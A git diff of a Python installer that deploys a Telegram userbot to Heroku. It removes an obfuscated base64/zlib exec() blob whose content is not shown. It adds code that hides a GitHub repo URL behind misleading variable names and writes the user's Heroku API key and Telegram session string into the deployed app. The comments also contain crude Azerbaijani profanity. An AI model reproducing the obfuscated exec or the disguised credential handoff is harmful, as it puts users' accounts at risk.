@@ -1,4 +1,192 @@
+#Əkmə peysər 
+#Əkənin anasın sikim
 
-# Python obfuscation by freecodingtools.org
-                    
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))
+import heroku3
+from time import time
+import random
+import requests
+from git import Repo
+from dto_installer import *
+from .astring import main
+import os
+from telethon import TelegramClient, functions
+from telethon.sessions import StringSession
+from telethon.tl.functions.channels import EditPhotoRequest, CreateChannelRequest
+from asyncio import get_event_loop
+from .language import LANG, COUNTRY, LANGUAGE, TZ
+from rich.prompt import Prompt, Confirm
+import base64
+
+LANG = LANG['MAIN']
+
+def connect (api):
+    heroku_conn = heroku3.from_key(api)
+    try:
+        heroku_conn.apps()
+    except:
+        hata(LANG['INVALID_KEY'])
+        exit(1)
+    return heroku_conn
+
+def createApp (connect):
+    appname = "up" + str(time() * 1000)[-4:].replace(".", "") + str(random.randint(0,500))
+    try:
+        connect.create_app(name=appname, stack_id_or_name='container', region_id_or_name="eu")
+    except requests.exceptions.HTTPError:
+        hata(LANG['MOST_APP'])
+        exit(1)
+    return appname
+
+def hgit (connect, repo, appname):
+    global api
+    app = connect.apps()[appname]
+    giturl = app.git_url.replace(
+            "https://", "https://api:" + api + "@")
+
+    if "heroku" in repo.remotes:
+        remote = repo.remote("heroku")
+        remote.set_url(giturl)
+    else:
+        remote = repo.create_remote("heroku", giturl)
+    try:
+        remote.push(refspec="HEAD:refs/heads/master", force=True)
+    except Exception as e:
+        hata(LANG['ERROR'] + str(e))
+
+    bilgi(LANG['POSTGRE'])
+    app.install_addon(plan_id_or_name='629911da-9c07-4d5e-9b1f-3cf042a3a7d5', config={})
+    basarili(LANG['SUCCESS_POSTGRE'])
+    return app
+
+async def botlog (String, Api, Hash):
+    Client = TelegramClient(StringSession(String), Api, Hash)
+    await Client.start()
+
+    KanalId = await Client(CreateChannelRequest(
+        title='A P E X -  BotLog',
+        about=LANG['AUTO_BOTLOG'],
+        megagroup=True
+    ))
+    KanalId = KanalId.chats[0].id
+    
+    Photo = await Client.upload_file(file='dtologo.jpg')
+    await Client(EditPhotoRequest(channel=KanalId, 
+        photo=Photo))   
+    msg = await Client.send_message(KanalId, LANG['DONT_LEAVE'])
+    await msg.pin()
+
+    KanalId = str(KanalId)
+    if "-100" in KanalId:
+        return KanalId
+    else:
+        return "-100" + KanalId
+
+if __name__ == "__main__":
+    logo(LANGUAGE)
+    loop = get_event_loop()
+    api = soru(LANG['HEROKU_KEY'])
+    bilgi(LANG['HEROKU_KEY_LOGIN'])
+    heroku = connect(api)
+    basarili(LANG['LOGGED'])
+
+    # Telegram #
+    onemli(LANG['GETTING_STRING_SESSION'])
+    stri, aid, ahash = main()
+    basarili(LANG['SUCCESS_STRING'])
+    baslangic = time()
+
+    # Heroku #
+    bilgi(LANG['CREATING_APP'])
+    appname = createApp(heroku)
+    basarili(LANG['SUCCESS_APP'])
+    onemli(LANG['DOWNLOADING'])
+    #Əkmə peysər#
+    SyperStringKey = "delta"
+    GiperStringKey = "sahibziko/"
+    InvalidKey = "http://github.com/" 
+    str1 = InvalidKey+GiperStringKey+SyperStringKey
+
+    if os.path.isdir("./Userator/"):
+        rm_r("./Userator/")
+    repo = Repo.clone_from(str1,"./Userator/", branch="master")
+    basarili(LANG['DOWNLOADED'])
+    onemli(LANG['DEPLOYING'])
+    app = hgit(heroku, repo, appname)
+    config = app.config()
+
+    onemli(LANG['WRITING_CONFIG'])
+
+    config['ANTI_SPAMBOT'] = 'False'
+    config['ANTI_SPAMBOT_SHOUT'] = 'False'
+    config['ALIVE_NAME'] = ''
+    config['ALIVE_PIC'] = ''
+    config['ALIVE_ID_USER'] = ''
+    config["SUDO_ID"] = ""
+    config['API_HASH'] = ahash
+    config['API_KEY'] = str(aid)
+    config['BOTLOG'] = "False"
+    config['BOTLOG_CHATID'] = "0"
+    config['CLEAN_WELCOME'] = "True"
+    config['CONSOLE_LOGGER_VERBOSE'] = "False"
+    config['COUNTRY'] = COUNTRY
+    config['DEFAULT_BIO'] = "@apexuserbot"
+    config['GALERI_SURE'] = "60"
+    config['CHROME_DRIVER'] = "/usr/sbin/chromedriver"
+    config['GOOGLE_CHROME_BIN'] = "/usr/sbin/chromium"
+    config['HEROKU_APIKEY'] = api
+    config['HEROKU_APPNAME'] = appname
+    config['STRING_SESSION'] = stri
+    config['HEROKU_MEMEZ'] = "True"
+    config['LOGSPAMMER'] = "False"
+    config['PM_AUTO_BAN'] = "False"
+    config['PM_AUTO_BAN_LIMIT'] = "4"
+    config['TMP_DOWNLOAD_DIRECTORY'] = "./downloads/"
+    config['TZ'] = TZ
+    config['TZ_NUMBER'] = "1"
+    config['UPSTREAM_REPO_URL'] = "https://github.com/sahibziko/delta"
+    config['WARN_LIMIT'] = "3"
+    config['WARN_MODE'] = "gmute"
+    config['LANGUAGE'] = LANGUAGE
+    config['TELEGRAPH_SHORT_NAME'] = "Apex"
+    config["TMP_DOWNLOAD_DIRECTORY"] = "./DOWNLOADS/"
+
+    basarili(LANG['SUCCESS_CONFIG'])
+    bilgi(LANG['OPENING_DYNO'])
+    
+    try:
+        app.process_formation()["worker"].scale(1)
+    except:
+        hata(LANG['ERROR_DYNO'])
+        exit(1)
+        
+
+    basarili(LANG['OPENED_DYNO'])
+    basarili(LANG['SUCCESS_DEPLOY'])
+    tamamlandi(time() - baslangic)
+
+    Sonra = Confirm.ask(f"[bold yellow]{LANG['AFTERDEPLOY']}[/]", default=True)
+    if Sonra == True:
+        BotLog = False
+        Cevap = ""
+        while not Cevap == "3":
+            if Cevap == "1":
+                bilgi(LANG['OPENING_BOTLOG'])
+
+                KanalId = loop.run_until_complete(botlog(stri, aid, ahash))
+                config['BOTLOG'] = "True"
+                config['BOTLOG_CHATID'] = KanalId
+
+                basarili(LANG['OPENED_BOTLOG'])
+                BotLog = True
+            elif Cevap == "2":
+                if BotLog:
+                    config['LOGSPAMMER'] = "True"
+                    basarili(LANG['SUCCESS_LOG'])
+                else:
+                    hata(LANG['NEED_BOTLOG'])
+         
+            
+            bilgi(f"\[1] {LANG['BOTLOG']}\n[2] {LANG['NO_LOG']}\n\[3] {LANG['CLOSE']}")
+            
+            Cevap = Prompt.ask(f"[bold yellow]{LANG['WHAT_YOU_WANT']}[/]", choices=["1", "2", "3"], default="3")
+            basarili(LANG['SEEYOU'])
